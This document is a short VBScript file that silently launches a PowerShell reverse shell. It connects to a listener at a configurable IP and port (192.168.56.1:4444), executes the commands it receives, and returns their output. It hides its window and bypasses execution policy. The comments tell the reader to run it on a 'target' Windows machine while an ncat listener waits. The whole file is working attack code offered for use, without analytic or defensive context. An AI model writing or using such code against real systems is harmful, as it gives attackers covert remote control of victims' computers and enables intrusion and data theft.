Option Explicit

Dim strHost, intPort
' your device ip address goes here 
strHost = "192.168.56.1"

' put a port number for example: 4444 
intPort = 4444

Dim objShell
Set objShell = CreateObject("WScript.Shell")

Dim strCmd
strCmd = "powershell -NoP -NonI -W Hidden -Exec Bypass -Command ""$client = New-Object System.Net.Sockets.TCPClient('" & strHost & "'," & intPort & ");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"""

objShell.Run strCmd, 0, False

' Save this code as a .vbs file, for example, reverse_shell.vbs.
' Run it on the target Windows machine by double-clicking or via command line:
' cscript //nologo reverse_shell.vbs
' Make sure your listener is running on your machine with:
' ncat -lvnp 4444
